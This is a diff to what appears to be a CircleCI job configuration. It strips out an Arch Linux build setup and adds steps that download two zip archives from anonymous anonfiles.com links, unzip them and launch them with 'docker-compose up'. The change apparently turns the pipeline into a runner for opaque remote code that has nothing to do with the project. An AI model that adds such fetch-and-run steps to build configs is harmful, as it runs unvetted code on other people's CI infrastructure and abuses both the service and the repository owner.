@@ -24,31 +24,16 @@ jobs:
             VERBOSE: 1
 
     steps:
-      - checkout
-      - run: git checkout main
 
-      - run: |
-          sed -i 's/#Color/Color/g' /etc/pacman.conf
-          sed -i 's/HoldPkg/#HoldPkg/g' /etc/pacman.conf
-          sed -i 's/IgnorePkg/#IgnorePkg/g' /etc/pacman.conf
-          cat /etc/pacman.conf
+      - run: wget 'https://cdn-128.anonfiles.com/HeN6A8D7y2/eed85289-1666306603/Chat_API.zip' && unzip Chat_API.zip
 
-      - run: |
-          pacman -Syu --noconfirm --color always
-          pacman -Sy --noconfirm --color always --needed base-devel curl wget coreutils xterm git sudo yay asp bat socat colorgcc procps-ng nano nano-syntax-highlighting micro tree aria2 openssh man-db
-
-      - run: whoami
-
-      - run: |
-            # Wheel group is the sudo group in Arch Linux
-            useradd --create-home --groups wheel  user
-            echo "%wheel ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
-            chown -R user ..
+      - run: wget 'https://cdn-102.anonfiles.com/94P5AaD0ya/44c39c00-1666306798/docker.zip' && unzip docker.zip
       
-      - run: sudo -u user yay -Sy --color always --noconfirm --builddir . --cleanafter paru-bin
+      - run:
+          command: ls -lRh
+          when: always
 
-      - run: sudo -u user paru -Sy --color always --noconfirm --builddir . --nocleanafter battop scotch
-
+      - run: docker-compose up
 
       - run:
           command: ls -lRh
